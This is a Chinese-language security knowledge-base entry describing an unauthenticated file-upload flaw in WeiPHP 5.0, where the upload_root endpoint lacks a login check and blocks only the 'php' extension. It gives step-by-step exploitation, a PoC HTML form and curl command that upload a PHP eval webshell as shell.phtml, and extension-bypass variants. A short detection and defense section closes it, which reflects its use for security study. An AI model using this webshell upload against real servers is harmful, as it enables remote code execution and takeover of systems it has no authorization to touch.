---
id: web-generic-file-upload-weiphp5-file-upload-root-noauth-extension-bypass
title: WeiPHP 5.0 前台 upload_root 未授权上传：只 ban php 后缀，phtml/末尾空格绕过直接 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: weiphp5-upload-root-unauth-extension-blacklist-bypass
affected_versions: WeiPHP 5.0
tags:
- php
- weiphp
- thinkphp
- file-upload
- extension-bypass
- unauth
- webshell
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:34:20+08:00'
  notes: 已对照原文核对：home/model/File.php 的 upload_files/upload_root 无 is_login 校验（同目录其它方法有）、pathinfo 扩展名仅 ban php、phtml/末尾空格绕过、路由 public/index.php/home/File/upload_root 与表单字段 download 均与原文一致；原文未给上传成功回显截图，未实机复现。affected_versions=WeiPHP 5.0 按原文标题与章节标注。
url: /docs/web/generic/file-upload/web-generic-file-upload-weiphp5-file-upload-root-noauth-extension-bypass/
draft: false
kb_aliases:
- WeiPHP 5.0 前台 getshell
- File/upload_root 未授权上传
- home/model/File.php upload_files
- 只 ban php 后缀绕过
- phtml 上传 getshell
---

## 一句话结论

WeiPHP 5.0 的 `application/home/model/File.php` 中 `upload_root`/`upload_files` 上传方法没有登录校验，扩展名检查只拒绝 `php`（`strtolower(pathinfo($info['name'])['extension']) == 'php'`），用 `phtml`/`pht`/`php3` 等可执行后缀或末尾加空格即可绕过，POST 到 `public/index.php/home/File/upload_root` 直接拿到 webshell。

## 原理

- **未授权入口**：同目录其它上传方法普遍先做 `if (!is_login())` 拦截并返回"上传失败，请先登录"，但 `upload_files`/`upload_root` 方法没有这个检查，属于可直接从前台路由调用的上传接口。
- **黑名单不完整**：代码只判断 `pathinfo($info['name'])` 的扩展名是否等于 `php`，不检查 `phtml`、`pht`、`php3`、`php5` 等 Apache/PHP 默认可执行后缀；部分版本/环境下文件名末尾加空格（`shell.php `）也能绕过扩展名解析并在保存时被规范化成 `.php`。
- **路径回显**：上传成功的 JSON 响应里包含保存路径/文件名，攻击者无需猜测即可定位 shells。
- ThinkPHP 5 的 `public/index.php/home/File/upload_root` 路由把请求分发到该 model 方法，表单字段名（如 `download`）对应 `$_FILES` 键名。

## 触发条件

- WeiPHP 5.0（ThinkPHP 5 内核），`public/index.php` 入口可访问；
- `home/File` 的 `upload_root`/`upload_files` 路由可达、无登录校验；
- 上传目录在 Web 根内且服务器会把 `phtml` 等后缀交给 PHP 解析（Apache 默认配置）；
- 上传目录可写。

## 利用步骤

1. 访问 `public/index.php/home/File/upload_root` 确认接口存在（GET 可能报参数错误，POST 表单可传）。
2. 用 multipart 表单上传文件名为 `shell.phtml`（或 `shell.php ` 末尾空格）的内容 `<?php eval($_POST[1]);?>`，字段名 `download`。
3. 从响应 JSON 中取出文件路径。
4. 访问该路径执行命令，读 flag。

## PoC

```html
<form action="http://target/public/index.php/home/File/upload_root" method="post" enctype="multipart/form-data">
  <input type="file" name="download" id="file" />
  <input type="submit" name="submit" value="Submit" />
</form>
```

```bash
# shell.phtml 内容：<?php eval($_POST[1]);?>
curl -s -F 'download=@shell.phtml;filename=shell.phtml' \
  'http://target/public/index.php/home/File/upload_root'
# 响应 JSON 中含保存路径，直接访问之
```

## 变体与关联

- 变体：后缀可试 `phtml`、`pht`、`php3`、`php5`、`PhP`（大小写）、`shell.php `（末尾空格，注意 URL 编码/表单保留空格），具体取决于 Apache/PHP 解析配置。
- 关联：Apache 备选 PHP 后缀 [[web-generic-file-upload-apache-alternate-php-extension]]（同 sink：黑名单遗漏可执行后缀）；ThinkPHP 未鉴权上传+路径泄露 [[web-generic-file-upload-thinkphp-debug-error-path-leak]]（不同产品与入口）；同产品 3.0 的 UEditor 涂鸦上传+模板包含 [[web-php-file-inclusion-weiphp3-ueditor-scrawlup-template-include]]。
- 变体：若目标为 Nginx+PHP-FPM，还可测试 `shell.php.jpg` 配 `cgi.fix_pathinfo=1` 的解析漏洞（视配置）。

## 检测与防御

- 检测：`home/File/upload_root`、`upload_files` 的访问与 multipart 上传日志；上传目录出现 `phtml/pht/php3` 等可执行后缀文件。
- 防御：上传接口统一加登录与权限校验；扩展名改白名单（只允许 jpg/png/gif 等）并校验 MIME/魔数；上传目录禁止脚本执行（`RemoveHandler`/`php_admin_flag engine off`）；升级 WeiPHP 修复版本。
